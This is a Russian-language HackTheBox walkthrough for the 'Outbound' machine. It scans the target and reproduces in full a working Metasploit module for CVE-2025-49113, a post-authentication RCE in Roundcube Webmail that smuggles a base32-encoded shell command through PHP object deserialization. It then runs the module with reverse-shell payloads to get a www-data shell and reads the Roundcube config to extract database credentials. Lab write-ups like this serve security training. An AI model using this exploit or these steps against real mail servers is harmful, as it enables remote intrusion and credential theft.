Сначало как обычно сканируем цель с nmap

```bash
nmap -sV -sC -Pn 10.129.232.158
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-08 14:20 CDT
Nmap scan report for outbound.htb (10.129.232.158)
Host is up (0.079s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://mail.outbound.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.32 seconds
```

Мы видим редирект, добавим его в хост файл.

Видим webmail сервис, от него по условиям задачи у нас есть креды:

user: tyler
pass: LhKL1o9Nm3X2

![version of Webmail](image.png)

имея версию можно посмотреть наличие експлойтов.

Находим такую уязвимость: CVE 2025-49113

Она сожержит уже готовый експлойт для metexploit, поэтому мы создадим модуль с этим експлойтом:

```rb
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper
  include Msf::Exploit::CmdStager
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Roundcube ≤ 1.6.10 Post-Auth RCE via PHP Object Deserialization',
        'Description' => %q{
          Roundcube Webmail before 1.5.10 and 1.6.x before 1.6.11 allows remote code execution
          by authenticated users because the _from parameter in a URL is not validated
          in program/actions/settings/upload.php, leading to PHP Object Deserialization.

          An attacker can execute arbitrary system commands as the web server.
        },
        'Author' => [
          'Maksim Rogov', # msf module
          'Kirill Firsov', # disclosure and original exploit
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2025-49113'],
          ['URL', 'https://fearsoff.org/research/roundcube']
        ],
        'DisclosureDate' => '2025-06-02',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => [REPEATABLE_SESSION]
        },
        'Platform' => ['unix', 'linux'],
        'Targets' => [
          [
            'Linux Dropper',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_X64, ARCH_X86, ARCH_ARMLE, ARCH_AARCH64],
              'Type' => :linux_dropper,
              'DefaultOptions' => { 'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp' }
            }
          ],
          [
            'Linux Command',
            {
              'Platform' => ['unix', 'linux'],
              'Arch' => [ARCH_CMD],
              'Type' => :nix_cmd,
              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_bash' }
            }
          ]
        ],
        'DefaultTarget' => 0
      )
      )

    register_options(
      [
        OptString.new('USERNAME', [true, 'Email User to login with', '' ]),
        OptString.new('PASSWORD', [true, 'Password to login with', '' ]),
        OptString.new('TARGETURI', [true, 'The URI of the Roundcube Application', '/' ]),
        OptString.new('HOST', [false, 'The hostname of Roundcube server', ''])
      ]
    )
  end

  class PhpPayloadBuilder
    def initialize(command)
      @encoded = Rex::Text.encode_base32(command)
      @gpgconf = %(echo "#{@encoded}"|base32 -d|sh &#)
    end

    def build
      len = @gpgconf.bytesize
      %(|O:16:"Crypt_GPG_Engine":3:{s:8:"_process";b:0;s:8:"_gpgconf";s:#{len}:"#{@gpgconf}";s:8:"_homedir";s:0:"";};)
    end
  end

  def fetch_login_page
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path),
      'method' => 'GET',
      'keep_cookies' => true,
      'vars_get' => { '_task' => 'login' }
    )

    fail_with(Failure::Unreachable, "#{peer} - No response from web service") unless res
    fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected HTTP code #{res.code}") unless res.code == 200
    res
  end

  def check
    res = fetch_login_page

    unless res.body =~ /"rcversion"\s*:\s*(\d+)/
      fail_with(Failure::UnexpectedReply, "#{peer} - Unable to extract version number")
    end

    version = Rex::Version.new(Regexp.last_match(1).to_s)
    print_good("Extracted version: #{version}")

    if version.between?(Rex::Version.new(10100), Rex::Version.new(10509))
      return CheckCode::Appears
    elsif version.between?(Rex::Version.new(10600), Rex::Version.new(10610))
      return CheckCode::Appears
    end

    CheckCode::Safe
  end

  def build_serialized_payload
    print_status('Preparing payload...')

    stager = case target['Type']
             when :nix_cmd
               payload.encoded
             when :linux_dropper
               generate_cmdstager.join(';')
             else
               fail_with(Failure::BadConfig, 'Unsupported target type')
             end

    serialized = PhpPayloadBuilder.new(stager).build.gsub('"', '\\"')
    print_good('Payload successfully generated and serialized.')
    serialized
  end

  def exploit
    token = fetch_csrf_token
    login(token)

    payload_serialized = build_serialized_payload
    upload_payload(payload_serialized)
  end

  def fetch_csrf_token
    print_status('Fetching CSRF token...')

    res = fetch_login_page
    html = res.get_html_document

    token_input = html.at('input[name="_token"]')
    unless token_input
      fail_with(Failure::UnexpectedReply, "#{peer} - Unable to extract CSRF token")
    end

    token = token_input.attributes.fetch('value', nil)
    if token.blank?
      fail_with(Failure::UnexpectedReply, "#{peer} - CSRF token is empty")
    end

    print_good("Extracted token: #{token}")
    token
  end

  def login(token)
    print_status('Attempting login...')
    vars_post = {
      '_token' => token,
      '_task' => 'login',
      '_action' => 'login',
      '_url' => '_task=login',
      '_user' => datastore['USERNAME'],
      '_pass' => datastore['PASSWORD']
    }

    vars_post['_host'] = datastore['HOST'] if datastore['HOST']

    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path),
      'method' => 'POST',
      'keep_cookies' => true,
      'vars_post' => vars_post,
      'vars_get' => { '_task' => 'login' }
    )

    fail_with(Failure::Unreachable, "#{peer} - No response during login") unless res
    fail_with(Failure::UnexpectedReply, "#{peer} - Login failed (code #{res.code})") unless res.code == 302

    print_good('Login successful.')
  end

  def generate_from
    options = [
      'compose',
      'reply',
      'import',
      'settings',
      'folders',
      'identity'
    ]
    options.sample
  end

  def generate_id
    random_data = SecureRandom.random_bytes(8)
    timestamp = Time.now.to_f.to_s
    Digest::MD5.hexdigest(random_data + timestamp)
  end

  def generate_uploadid
    millis = (Time.now.to_f * 1000).to_i
    "upload#{millis}"
  end

  def upload_payload(payload_filename)
    print_status('Uploading malicious payload...')

    # 1x1 transparent pixel image
    png_data = Rex::Text.decode_base64('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAACklEQVR4nGMAAQAABQABDQottAAAAABJRU5ErkJggg==')
    boundary = Rex::Text.rand_text_alphanumeric(8)

    data = ''
    data << "--#{boundary}\r\n"
    data << "Content-Disposition: form-data; name=\"_file[]\"; filename=\"#{payload_filename}\"\r\n"
    data << "Content-Type: image/png\r\n\r\n"
    data << png_data
    data << "\r\n--#{boundary}--\r\n"

    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, "?_task=settings&_remote=1&_from=edit-!#{generate_from}&_id=#{generate_id}&_uploadid=#{generate_uploadid}&_action=upload"),
      'ctype' => "multipart/form-data; boundary=#{boundary}",
      'data' => data
    })

    print_good('Exploit attempt complete. Check for session.')
  end
end
```

Вот сюда копируем експлоит: vim ~/.msf4/modules/exploits/linux/http/roundcube_auth_cve_2025_49113.rb

```bash
msfconsole
reload_all
[msf](Jobs:0 Agents:0) >> use exploit/linux/http/roundcube_cve_2025_49113 
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(linux/http/roundcube_cve_2025_49113) >> set RHOSTS 10.129.232.158
RHOSTS => 10.129.232.158
[msf](Jobs:0 Agents:0) exploit(linux/http/roundcube_cve_2025_49113) >> set HOST mail.outbound.htb
HOST => mail.outbound.htb
[msf](Jobs:0 Agents:0) exploit(linux/http/roundcube_cve_2025_49113) >> set LHOST 10.10.14.222 
LHOST => 10.10.14.222
[msf](Jobs:0 Agents:0) exploit(linux/http/roundcube_cve_2025_49113) >> set USERNAME tyler
USERNAME => tyler
[msf](Jobs:0 Agents:0) exploit(linux/http/roundcube_cve_2025_49113) >> set PASSWORD LhKL1o9Nm3X2
PASSWORD => LhKL1o9Nm3X2
[msf](Jobs:0 Agents:0) exploit(linux/http/roundcube_cve_2025_49113) >> set VHOST mail.outbound.htb
VHOST => mail.outbound.htb
run
```

Готово 

```bash
(Meterpreter 1)(/) > shell
Process 1183 created.
Channel 1 created.
/bin/bash -i
bash: cannot set terminal process group (247): Inappropriate ioctl for device
bash: no job control in this shell
www-data@mail:/$ export TERM=xterm
export TERM=xterm
www-data@mail:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@mail:/$ ls -la /home
ls -la /home
total 32
drwxr-xr-x 1 root  root  4096 Jun  8 12:05 .
drwxr-xr-x 1 root  root  4096 Jul  9 12:41 ..
drwxr-x--- 1 jacob jacob 4096 Jun  7 13:55 jacob
drwxr-x--- 1 mel   mel   4096 Jun  8 12:06 mel
drwxr-x--- 1 tyler tyler 4096 Jun  8 13:28 tyler
www-data@mail:/$ ls -la /home/tyler
ls -la /home/tyler
ls: cannot open directory '/home/tyler': Permission denied
www-data@mail:/$ cat /var/www/html/roundcube/config/config*
cat /var/www/html/roundcube/config/config*
```

Тут мы находим пароль и юзера от БД:

```bash
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';
```

